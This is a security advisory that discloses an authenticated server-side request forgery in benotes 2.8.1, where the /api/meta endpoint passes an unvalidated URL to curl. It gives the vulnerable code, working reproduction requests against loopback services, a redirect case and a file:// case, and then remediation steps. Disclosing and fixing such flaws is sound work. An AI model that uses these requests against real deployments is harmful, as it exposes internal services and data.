<!-- gist description (stage 6): benotes Server-Side Request Forgery (Laravel 8) -->

# benotes Server-Side Request Forgery (Laravel 8)

**CWE-918 · Authenticated SSRF with content read-back and redirect following · GET /api/meta?url= → unvalidated curl_exec**

> **Vendor:** fr0tt
> **Product:** benotes (standalone Laravel 8 application, not a WordPress plugin)
> **Affected version:** 2.8.1 (master branch, commit cb803b32340eb7720131a9d0b93261d01800c896, 2023-11-04)
> **Affected endpoints:** GET /api/meta?url=<attacker URL> (routes/api.php, auth:api)
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Sensitive extracted values (credentials) have been redacted from this public disclosure.

## 1. Summary

The bookmark metadata endpoint `GET /api/meta?url=` validates the URL only with Laravel's `url` rule (FILTER_VALIDATE_URL, scheme-agnostic) and then fetches it server-side with `curl_exec` (`CURLOPT_FOLLOWLOCATION=1`). There is no scheme allow-list, no private-IP block and no redirect re-validation; the fetched page's `<title>`/meta description are returned to the caller as JSON. Any authenticated user can therefore make the server request arbitrary URLs — including loopback/internal targets — and read parts of the response back.

## 2. Root Cause

| File:Line | Role |
|---|---|
| `routes/api.php` (auth:api group) | `Route::get('meta', ...)` — authentication only |
| `app/Http/Controllers/PostController.php:274-281` | `getUrlInfo()`: `$this->validate($request, ['url' => 'url'])` — FILTER_VALIDATE_URL accepts any scheme |
| `app/Services/PostService.php:192-208` | `getInfo($url)`: `curl_init` + `CURLOPT_FOLLOWLOCATION=1` + `CURLOPT_URL=$url` → `curl_exec`, no scheme/IP/redirect checks |

```php
// app/Http/Controllers/PostController.php:274-281
public function getUrlInfo(Request $request)
{
    $this->validate($request, [
        'url' => 'url'          // FILTER_VALIDATE_URL - scheme-agnostic
    ]);
    return response()->json($this->service->getInfo($request->url));
}

// app/Services/PostService.php:192-208 (excerpt)
$ch = curl_init();
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);   // redirects followed, never re-validated
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
curl_setopt($ch, CURLOPT_URL, $url);           // attacker-controlled, any scheme
$html = curl_exec($ch);
```

The response is parsed for title/description/theme-color and returned to the attacker as JSON (partial content read-back). Laravel 8.83's `url` validation rule explicitly allows the `file`, `dict`, `gopher` and `ftp` schemes.

## 3. Prerequisites

- Any authenticated account (JWT via `/api/auth/login`). Accounts are created by an admin — there is no public self-registration.
- No network position required: the target can be a loopback-only service on the benotes host.

## 4. Reproduction

Control — no token, 401:

```http
GET /api/meta?url=http://127.0.0.1:8484/ HTTP/1.1

HTTP/1.1 401 Unauthorized
```

Internal HTTP fetch with content read-back (loopback-only victim service):

```http
GET /api/meta?url=http://127.0.0.1:8484/ HTTP/1.1
Authorization: Bearer <VALID_JWT>

HTTP/1.1 200 OK
{"url":"http://127.0.0.1:8484/","base_url":"http://127.0.0.1",
 "title":"SECRET-INTERNAL-TITLE-SSRFPROOF","description":"internal-secret-desc-9f2",
 "color":"#123456","image_path":null}
```

Redirect following (CURLOPT_FOLLOWLOCATION) — victim 302s to a second internal path:

```http
GET /api/meta?url=http://127.0.0.1:8484/redir.php HTTP/1.1
Authorization: Bearer <VALID_JWT>

HTTP/1.1 200 OK
{"title":"SECRET-AFTER-REDIRECT-777","description":"via-followlocation", ...}
```

Scheme breadth — `file://` passes validation and is fetched server-side (no read-back only because the parser extracts HTML title/meta):

```http
GET /api/meta?url=file://localhost/<canary-path> HTTP/1.1
Authorization: Bearer <VALID_JWT>

HTTP/1.1 200 OK
```

## 5. Confirmed Techniques

- Live reproduction on the installed app (Laravel 8.83, PHP built-in server, sqlite): loopback fetch + `<title>`/meta read-back verified; 302 hop followed and second page's content read back; `file://localhost/...` passed the `url` rule and reached libcurl.
- Non-HTTP schemes (`dict://`, `gopher://`, `ftp://`) reach libcurl the same way; internal services can be probed by differentiating response shape / content-type / timing.
- Aggravator observed in code: bookmark URLs saved through the same flow are later fetched server-side by headless Chrome (`PostService::crawlWithChrome` ← `ProcessMissingThumbnail` job / thumbnail command), extending the reachable internal surface.

## 6. Impact

- An authenticated user can probe and partially read internal/loopback services that are not reachable from outside (admin panels, metadata services, internal APIs).
- Redirect following lets an attacker pivot the request after initial validation-equivalents, and the JSON read-back (title/description) exfiltrates internal content markers.
- No integrity/availability impact observed (read-only fetch); impact is information disclosure of internal network state and content.

## 7. CVSS 3.1

`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` (Base 4.3, Medium)

## 8. Remediation

1. Allow-list `http`/`https` schemes only, before any fetch.
2. Resolve the hostname and refuse private/link-local/loopback ranges; pin the resolved IP for the actual request (defeats DNS rebinding).
3. Re-validate every redirect hop, or set `CURLOPT_FOLLOWLOCATION` to 0 and handle redirects manually.
4. Treat the server-side Chrome crawler with the same URL policy.

## 9. References

- Project: https://github.com/fr0tt/benotes
- CWE-918: https://cwe.mitre.org/data/definitions/918.html
- External disclosure: https://gist.github.com/qianqiusujiu/58f979be4c9bbd1cf2864d85e79603d8
- VulDB submission #xxxxxx

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
